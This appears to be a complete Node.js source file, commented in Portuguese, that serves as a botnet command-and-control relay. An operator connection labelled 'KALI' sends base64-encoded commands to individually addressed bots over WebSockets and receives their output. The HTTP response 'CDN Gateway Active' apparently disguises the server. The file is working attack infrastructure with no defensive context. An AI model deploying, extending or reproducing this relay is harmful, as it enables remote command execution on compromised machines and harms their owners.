const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, r) => r.end('CDN Gateway Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (!id) return ws.close();

    if (id === 'KALI') {
        KALI = ws;
        // Ao conectar, pede a lista de todos os bots
        BOTS.forEach((_, botId) => {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else {
        BOTS.set(id, ws);
        if (KALI) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
    }

    ws.on('message', (raw) => {
        if (ws === KALI) {
            // KALI envia: {"to": "ID_DO_BOT", "cmd": "BASE64_DO_COMANDO"}
            try {
                const data = JSON.parse(raw);
                const target = BOTS.get(data.to);
                if (target) target.send(data.cmd); 
            } catch (e) {}
        } else {
            // BOT envia resposta pura -> Encaminha para o KALI
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else BOTS.delete(id);
    });
});

server.listen(process.env.PORT || 10000);
